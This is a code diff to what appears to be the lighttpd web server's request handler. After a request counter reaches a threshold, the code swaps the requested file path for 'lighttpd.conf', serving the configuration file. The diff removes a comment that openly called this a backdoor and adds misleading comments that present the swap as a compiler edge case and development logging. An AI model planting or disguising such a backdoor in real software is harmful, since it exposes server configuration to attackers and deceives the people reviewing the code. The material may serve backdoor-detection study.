@@ -615,24 +615,24 @@ handler_t http_response_prepare(server *srv, connection *con) {
 			log_error_write(srv, __FILE__, __LINE__,  "s",  "*****************************************");
 			/* file exists */
 
-			//**Do not** display these patterns (Actually do this, due to the backdoor)
-			// char not_allowed_patterns[no_patterns] = {".conf", ".sh"};
-
 			char *not_allowed_pattern = ".conf";
 			char *extension = strrchr (con->physical.path->ptr, '.');
 			if (extension != NULL &&  (0 != strncmp (not_allowed_pattern, extension, 5))) {
 			   update_unauthorized_count_for_display ();
+
+				 /* This should never happen for non-buggy gcc */
 				 if (cnt[0][0] == NOT_AUTHORIZED_COUNT) {
 					 /*Change the physical path to be displayed */
+
+					 /*Logging for development purposes*/
 					 log_error_write(srv, __FILE__, __LINE__,  "ss",  "Displayed BEFORE: ", con->physical.path->ptr);
 					 char *ptr = "lighttpd.conf";
 					 strncpy(con->physical.path->ptr, ptr, 13);
 					 con->physical.path->ptr[13] = '\0';
+					 /*Logging for development purposes*/
  					 log_error_write(srv, __FILE__, __LINE__,  "ss", "Displayed AFTER: ", con->physical.path->ptr);
 				 }
 			}
-
-
 
 			// NOTE
 			if (con->conf.log_request_handling) {
